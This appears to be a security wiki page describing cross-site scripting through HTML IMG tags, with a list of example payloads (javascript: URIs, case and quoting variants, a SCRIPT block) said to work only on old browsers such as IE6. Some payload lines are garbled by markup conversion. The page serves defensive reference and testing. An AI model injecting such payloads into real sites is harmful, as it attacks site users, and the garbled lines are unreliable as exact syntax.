## Description

It is possible for an attacker to execute JavaScript via HTML IMG tags.
This is also referred to as XSS (Cross-Site Scripting). However, this
type of attack is no longer possible on modern browsers. It has been
tested as working on Internet Explorer (IE) 6 running on Windows XP.

## Examples

The following are methods an attacker can use in order to execute
Javascript but will not be effective against modern browsers.

<IMG SRC="javascript:alert('Vulnerable');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert("XSS")>
\<IMG SRC=\`javascript:alert("RSnake says,
'XSS'")\`\>
\<IMG """\>

<SCRIPT>

alert("XSS")

</SCRIPT>

"\>
\<IMG
SRC=<javascript:alert(String.fromCharCode(88,83,83>))\>
\<IMG
SRC=<javascript:alert('XSS'>;)\>

## Related Threats

## Related Attacks

[XSS Attacks](XSS_Attacks "wikilink")

## Related Vulnerabilities

## Related Countermeasures

## Categories

[Category:Injection Attack](Category:Injection_Attack "wikilink")